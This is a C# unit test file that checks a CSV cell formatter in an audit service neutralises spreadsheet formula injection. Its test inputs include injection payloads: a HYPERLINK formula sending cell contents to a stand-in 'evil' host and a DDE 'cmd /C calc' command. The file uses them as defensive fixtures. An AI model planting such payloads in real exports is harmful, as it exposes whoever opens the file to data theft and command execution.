using OtterWorks.AuditService.Services;

namespace AuditService.Tests;

public class CsvCellTests
{
    [Theory]
    [InlineData("=HYPERLINK(\"https://evil/\"&A1)", "\"'=HYPERLINK(\"\"https://evil/\"\"&A1)\"")]
    [InlineData("+1+cmd|' /C calc'!A0", "\"'+1+cmd|' /C calc'!A0\"")]
    [InlineData("-2+3", "\"'-2+3\"")]
    [InlineData("@SUM(1,2)", "\"'@SUM(1,2)\"")]
    [InlineData("\t=1+1", "\"'\t=1+1\"")]
    [InlineData("\r=1+1", "\"'\r=1+1\"")]
    [InlineData("\n=1+1", "\"'\n=1+1\"")]
    public void Format_PrefixesFormulaTriggers(string value, string expected)
    {
        Assert.Equal(expected, CsvCell.Format(value));
    }

    [Theory]
    [InlineData("user-123", "\"user-123\"")]
    [InlineData("10.0.0.1", "\"10.0.0.1\"")]
    [InlineData("Mozilla/5.0 \"quoted\"", "\"Mozilla/5.0 \"\"quoted\"\"\"")]
    [InlineData("a=b", "\"a=b\"")]
    [InlineData("", "\"\"")]
    [InlineData(null, "\"\"")]
    public void Format_LeavesSafeValuesUnchanged(string? value, string expected)
    {
        Assert.Equal(expected, CsvCell.Format(value));
    }
}
